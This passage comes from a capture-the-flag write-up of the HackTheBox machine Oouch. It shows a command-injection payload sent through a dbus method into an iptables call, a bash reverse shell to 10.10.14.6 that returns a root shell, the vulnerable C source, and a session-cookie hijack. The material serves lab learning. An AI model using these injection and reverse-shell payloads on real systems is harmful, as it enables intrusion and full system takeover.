+                <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Error while opening </span><span class="sh">'</span><span class="s">urls.txt</span><span class="sh">'"</span><span class="p">)</span>
+
+        <span class="c1"># In any case, we inform the user that has message has been sent
+</span>        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">contact.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="sh">'</span><span class="s">Contact</span><span class="sh">'</span><span class="p">,</span> <span class="n">send</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
+
+    <span class="c1"># Except the functions goes up to here. In this case, no form was submitted and we do not need to inform the user
+</span>    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">'</span><span class="s">contact.html</span><span class="sh">'</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="sh">'</span><span class="s">Contact</span><span class="sh">'</span><span class="p">,</span> <span class="n">send</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">form</span><span class="p">)</span>
+</code></pre></div></div>
+<p>In the middle of that route, it checks the input data against the <code class="language-plaintext highlighter-rouge">primitive_xss</code> search, and if it matches, it uses <code class="language-plaintext highlighter-rouge">dbus</code> to send the client IP and then closes the connection, returning the Hacker page.</p>
+<p>I know when this happens, I’m blocked from communicating with Oouch for a minute, and the note earlier suggested it was via IP tables.</p>
+<h3 id="exploit-1">Exploit</h3>
+<p>I’m going to hypothesize that the dbus server is receiving IPs and running an <code class="language-plaintext highlighter-rouge">iptables</code> command to block it, and that I might be able to do command injection if it is not handling that input correctly.</p>
+<p>I opened a local Python shell and used the commands in the web-app as a template. <code class="language-plaintext highlighter-rouge">import dbus</code> fails, until I set the path like in the app, and then it works:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@aeb4525789d8:/code$</span><span class="w"> </span><span class="n">python</span>
+<span class="go">Python 3.7.6 (default, Feb  2 2020, 09:11:24) 
+[GCC 8.3.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">dbus</span>
+<span class="go">Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+ModuleNotFoundError: No module named 'dbus'
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">sys</span>                                          
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">insert</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">/usr/lib/python3/dist-packages</span><span class="sh">"</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="kn">import</span> <span class="n">dbus</span>
+</code></pre></div></div>
+<p>Now I’ll create a <code class="language-plaintext highlighter-rouge">bus</code> object, and set the interface.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bus</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="nc">SystemBus</span><span class="p">()</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">block_object</span> <span class="o">=</span> <span class="n">bus</span><span class="p">.</span><span class="nf">get_object</span><span class="p">(</span><span class="sh">'</span><span class="s">htb.oouch.Block</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/htb/oouch/Block</span><span class="sh">'</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">block_iface</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="nc">Interface</span><span class="p">(</span><span class="n">block_object</span><span class="p">,</span> <span class="n">dbus_interface</span><span class="o">=</span><span class="sh">'</span><span class="s">htb.oouch.Block</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>For a payload, I’ll see if I can just append a <code class="language-plaintext highlighter-rouge">ping</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">client_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">; ping -c 1 10.10.14.6 #</span><span class="sh">'</span>
+</code></pre></div></div>
+<p>With <code class="language-plaintext highlighter-rouge">tcpdump</code> listening,  I’ll submit it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">response</span> <span class="o">=</span> <span class="n">block_iface</span><span class="p">.</span><span class="nc">Block</span><span class="p">(</span><span class="n">client_ip</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">response</span>
+<span class="go">dbus.String('Carried out :D')
+</span><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bus</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p>As soon as I sent the first command above, <code class="language-plaintext highlighter-rouge">tcpdump</code> got a hit:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>tcpdump <span class="nt">-i</span> tun0 icmp                                       
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+11:24:08.919117 IP 10.10.10.177 &gt; 10.10.14.6: ICMP echo request, id 4646, seq 1, length 64
+11:24:08.919140 IP 10.10.14.6 &gt; 10.10.10.177: ICMP echo reply, id 4646, seq 1, length 64  
+</span></code></pre></div></div>
+<p>It also worked with the command in <code class="language-plaintext highlighter-rouge">$()</code>. Now I’ll try a real payload:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bus</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="nc">SystemBus</span><span class="p">()</span>                                                      
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">block_object</span> <span class="o">=</span> <span class="n">bus</span><span class="p">.</span><span class="nf">get_object</span><span class="p">(</span><span class="sh">'</span><span class="s">htb.oouch.Block</span><span class="sh">'</span><span class="p">,</span> <span class="sh">'</span><span class="s">/htb/oouch/Block</span><span class="sh">'</span><span class="p">)</span>        
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">block_iface</span> <span class="o">=</span> <span class="n">dbus</span><span class="p">.</span><span class="nc">Interface</span><span class="p">(</span><span class="n">block_object</span><span class="p">,</span> <span class="n">dbus_interface</span><span class="o">=</span><span class="sh">'</span><span class="s">htb.oouch.Block</span><span class="sh">'</span><span class="p">)</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">client_ip</span> <span class="o">=</span> <span class="sh">'</span><span class="s">; bash -c </span><span class="sh">"</span><span class="s">bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1</span><span class="sh">"</span><span class="s"> #</span><span class="sh">'</span>
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">response</span> <span class="o">=</span> <span class="n">block_iface</span><span class="p">.</span><span class="nc">Block</span><span class="p">(</span><span class="n">client_ip</span><span class="p">)</span>                                     
+<span class="gp">&gt;&gt;&gt;</span><span class="w"> </span><span class="n">bus</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
+</code></pre></div></div>
+<p>On submitting, I get a root shell on Oouch:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali#</span><span class="w"> </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">listening on [any] 443 ...
+connect to [10.10.14.6] from (UNKNOWN) [10.10.10.177] 51146
+bash: cannot set terminal process group (2419): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">root@oouch:/root#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre></div></div>
+<p>And I can grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@oouch:/root#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">b8371f67************************
+</span></code></pre></div></div>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="dbus--iptables">dbus + iptables</h3>
+<p>I saw how in the web code it send IPs over dbus. As root, I can see how they are used. In <code class="language-plaintext highlighter-rouge">/root</code>, there’s <code class="language-plaintext highlighter-rouge">dbus-server</code>, and it’s source, <code class="language-plaintext highlighter-rouge">dbus-server.c</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@oouch:/root#</span><span class="w"> </span><span class="nb">ls</span>
+<span class="go">credits.txt  dbus-server  dbus-server.c  get_pwnd.log  get_pwnd.py  root.txt
+</span></code></pre></div></div>
+<p>Looking at the source, this table tells the bus how to handle incoming messages:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* The vtable of our little object, implements the net.poettering.Calculator interface */</span>             
+<span class="k">static</span> <span class="k">const</span> <span class="n">sd_bus_vtable</span> <span class="n">block_vtable</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>                                                         
+        <span class="n">SD_BUS_VTABLE_START</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>   
+        <span class="n">SD_BUS_METHOD</span><span class="p">(</span><span class="s">"Block"</span><span class="p">,</span> <span class="s">"s"</span><span class="p">,</span> <span class="s">"s"</span><span class="p">,</span> <span class="n">method_block</span><span class="p">,</span> <span class="n">SD_BUS_VTABLE_UNPRIVILEGED</span><span class="p">),</span>                   
+        <span class="n">SD_BUS_VTABLE_END</span>                                                                             
+<span class="p">};</span>     
+</code></pre></div></div>
+<p>The “Block” dbus method should go to <code class="language-plaintext highlighter-rouge">method_block</code>. This function will pull out the message, read it into <code class="language-plaintext highlighter-rouge">host</code>. Then it uses <code class="language-plaintext highlighter-rouge">sprintf</code> to put the host into a string to form the <code class="language-plaintext highlighter-rouge">iptables</code> command:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">int</span> <span class="nf">method_block</span><span class="p">(</span><span class="n">sd_bus_message</span> <span class="o">*</span><span class="n">m</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">userdata</span><span class="p">,</span> <span class="n">sd_bus_error</span> <span class="o">*</span><span class="n">ret_error</span><span class="p">)</span> <span class="p">{</span> 
+        <span class="kt">char</span><span class="o">*</span> <span class="n">host</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>  
+        <span class="kt">int</span> <span class="n">r</span><span class="p">;</span>
+
+        <span class="cm">/* Read the parameters */</span>                                                                     
+        <span class="n">r</span> <span class="o">=</span> <span class="n">sd_bus_message_read</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="s">"s"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">host</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>                  
+                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to obtain hostname: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="o">-</span><span class="n">r</span><span class="p">));</span> 
+                <span class="k">return</span> <span class="n">r</span><span class="p">;</span>   
+        <span class="p">}</span>                                                                                             
+                                                                                                      
+        <span class="kt">char</span> <span class="n">command</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"iptables -A PREROUTING -s %s -t mangle -j DROP"</span><span class="p">;</span>    
+                                                                                                      
+        <span class="kt">int</span> <span class="n">command_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">command</span><span class="p">);</span>
+        <span class="kt">int</span> <span class="n">host_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">host</span><span class="p">);</span>                                                                  
+                                                                                                      
+        <span class="kt">char</span><span class="o">*</span> <span class="n">command_buffer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">((</span><span class="n">host_len</span> <span class="o">+</span> <span class="n">command_len</span><span class="p">)</span> <span class="o">*</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>               
+        <span class="k">if</span><span class="p">(</span><span class="n">command_buffer</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>               
+                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Failed to allocate memory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>                                       
+                <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>                                                                                                                                                                                   
+        <span class="p">}</span>                       
+                                                   
+        <span class="n">sprintf</span><span class="p">(</span><span class="n">command_buffer</span><span class="p">,</span> <span class="n">command</span><span class="p">,</span> <span class="n">host</span><span class="p">);</span>
+                                                   
+        <span class="cm">/* In the first implementation, we simply ran command using system(), since the expected DBus
+         * to be threading automatically. However, DBus does not thread and the application will hang  
+         * forever if some user spawns a shell. Therefore we need to fork (easier than implementing real 
+         * multithreading)                                                                            
+         */</span>        
+        <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span>
+
+        <span class="k">if</span> <span class="p">(</span> <span class="n">pid</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="cm">/* Here we are in the child process. We execute the command and eventually exit. */</span>
+            <span class="n">system</span><span class="p">(</span><span class="n">command_buffer</span><span class="p">);</span>
+            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="cm">/* Here we are in the parent process or an error occurred. We simply send a generic message.  
+             * In the first implementation we returned separate error messages for success or failure. 
+             * However, now we cannot wait for results of the system call. Therefore we simply return
+             * a generic. */</span>
+            <span class="k">return</span> <span class="n">sd_bus_reply_method_return</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="s">"s"</span><span class="p">,</span> <span class="s">"Carried out :D"</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">system</span><span class="p">(</span><span class="n">command_buffer</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>At the end, it calls fork, and in the child process, calls <code class="language-plaintext highlighter-rouge">system</code> on the <code class="language-plaintext highlighter-rouge">iptables</code> command string it built earlier.</p>
+<p>I can also see in the root crontab that there’s a cron to clear the PREROUTING table every minute, removing the blocks:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@oouch:/root#</span><span class="w"> </span>crontab <span class="nt">-l</span>
+<span class="go">* * * * * /root/get_pwnd.py &gt; /root/get_pwnd.log  2&gt;&amp;1
+* * * * * /usr/sbin/iptables -F PREROUTING -t mangle
+</span></code></pre></div></div>
+<h3 id="unintended-session-hijack">Unintended Session Hijack</h3>
+<p>For some reason, when qtc’s browser got the redirect from the authorization server back to my malicious app, the automation decided to include qtc’s session cookie for the authorization server. It makes no sense that this cookie is there, cookies for authorization.oouch.htb should not be sent to any other website, including 10.10.14.6. But it is, and I can use the Firefox dev tools, in the Storage tab, to change the <code class="language-plaintext highlighter-rouge">sessionid</code> cookie to the one I just got back:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200311070031416.webp" type="image/webp"/>
+<img alt="image-20200311070031416" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200311070031416.png"/>
+</picture>
+<p>On refreshing the page, I’m now logged in as qtc:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20200311070056176.webp" type="image/webp"/>
+<img alt="image-20200311070056176" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20200311070056176.png"/>
+</picture>
+<p>There’s not much here to do.</p>
+<p>I did take a quick look at the automation as root, but I didn’t have time to figure out why the cookie was being sent.</p>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2020/08/01/htb-oouch.html"></a>
+</article>
